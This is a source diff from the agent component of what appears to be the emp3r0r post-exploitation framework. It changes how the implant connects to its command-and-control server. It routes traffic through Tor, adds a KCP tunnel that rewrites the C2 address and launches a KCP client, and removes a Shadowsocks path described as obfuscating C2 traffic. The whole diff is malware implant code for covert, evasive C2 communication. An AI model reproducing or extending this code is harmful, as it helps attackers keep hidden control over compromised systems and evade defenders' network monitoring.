@@ -165,6 +165,7 @@ test_agent:
 		go socketListen()
 	}
 
+	// Construct CC address
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_def.CCAddress) {
 		// if CC is on Tor, CCPort won't be used since Tor handles forwarding
@@ -175,6 +176,14 @@ test_agent:
 			agent.RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
 		}
 		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_def.CCAddress, agent.RuntimeConfig.C2TransportProxy)
+	} else if agent.RuntimeConfig.UseKCP {
+		// enable kcp multiplexing tunnel
+		// KCP tunnel connects to C2 server, so we need to set CCPort to KCPClientPort
+		agent.RuntimeConfig.CCPort = agent.RuntimeConfig.KCPClientPort
+		emp3r0r_def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s/", agent.RuntimeConfig.CCPort)
+
+		// run KCP
+		go agent.KCPC2Client() // KCP client will run when UseKCP is set
 	} else {
 		// parse C2 address
 		// append CCPort to CCAddress
@@ -214,17 +223,6 @@ test_agent:
 			}
 		}()
 		agent.RuntimeConfig.C2TransportProxy = cdnproxyAddr
-	}
-
-	// enable shadowsocks / kcp
-	if agent.RuntimeConfig.UseShadowsocks {
-		// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
-		agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
-			agent.RuntimeConfig.ShadowsocksLocalSocksPort)
-
-		// run ss w/wo KCP
-		go agent.ShadowsocksC2Client()
-		go agent.KCPC2Client() // KCP client will run when UseKCP is set
 	}
 
 	// do we have internet?
